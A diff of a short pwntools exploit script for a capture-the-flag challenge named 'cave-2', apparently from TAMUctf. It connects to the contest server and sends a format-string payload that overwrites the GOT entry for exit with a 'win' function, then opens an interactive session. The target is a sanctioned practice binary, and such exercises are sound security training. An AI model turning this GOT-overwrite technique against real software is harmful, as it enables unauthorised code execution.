@@ -8,26 +8,12 @@ rop = ROP(exe)
 
 context.binary = exe
 context.terminal = "kitty"
-def conn():
-    if args.REMOTE:
-        return remote("localhost", 7009)
-    elif args.GDB:
-        return gdb.debug([exe.path])
-    else:
-        return process([exe.path])
 
+CHAL = "cave-2"
 
-def main():
-    r = conn()
+p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)
 
-    payload = fmtstr_payload(6, {exe.got['exit']: exe.symbols['win']})
-    r.sendline(payload)
-    
-    # good luck pwning :)
+payload = fmtstr_payload(6, {exe.got['exit']: exe.symbols['win']})
+p.sendline(payload)
 
-    r.interactive()
-
-
-if __name__ == "__main__":
-    main()
-
+p.interactive()
